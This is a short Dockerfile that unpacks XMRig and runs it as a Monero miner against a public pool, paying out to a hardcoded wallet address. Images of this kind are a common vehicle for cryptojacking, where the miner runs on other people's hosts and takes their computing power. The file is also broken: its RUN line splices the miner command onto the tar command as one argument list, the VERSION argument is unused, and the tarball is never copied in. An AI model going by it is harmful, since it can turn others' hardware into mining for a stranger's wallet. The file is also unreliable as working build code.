FROM alpine

ARG VERSION=6.18.0
WORKDIR ./src/
RUN tar zxvf xmrig-6.18.0-linux-static-x64.tar.gz -C /src/ \
./xmrig --donate-level 5 -o pool.supportxmr.com:443 -u 466rMXjH3VcW9qUSVjjkdXREYLGvBd2RwVg295Z7jrMJTnSzQbGbpgSEWpomVV7FNnikzDkYf7Fs4EVQRviBuPQD1ofi4Ck -k --tls -p Rin
